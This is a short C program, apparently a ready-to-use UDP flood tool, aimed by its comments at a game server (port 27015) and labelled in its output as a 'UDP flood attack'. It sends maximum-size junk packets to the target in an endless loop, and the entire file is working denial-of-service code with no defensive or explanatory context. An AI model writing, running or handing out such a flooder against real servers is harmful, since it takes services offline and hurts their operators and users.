#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <unistd.h>

#define PACKET_SIZE 65507  // Max UDP payload size

int main() {
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        perror("Socket creation failed");
        return 1;
    }

    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(27015);  // Replace with your game server port
    server.sin_addr.s_addr = inet_addr("192.168.1.10");  // Replace with your game server IP

    char *packet = malloc(PACKET_SIZE);
    memset(packet, 'A', PACKET_SIZE);  // Random payload

    printf("Starting UDP flood attack...\n");
    
    while (1) {
        sendto(sock, packet, PACKET_SIZE, 0, (struct sockaddr*)&server, sizeof(server));
    }

    free(packet);
    close(sock);
    return 0;
}
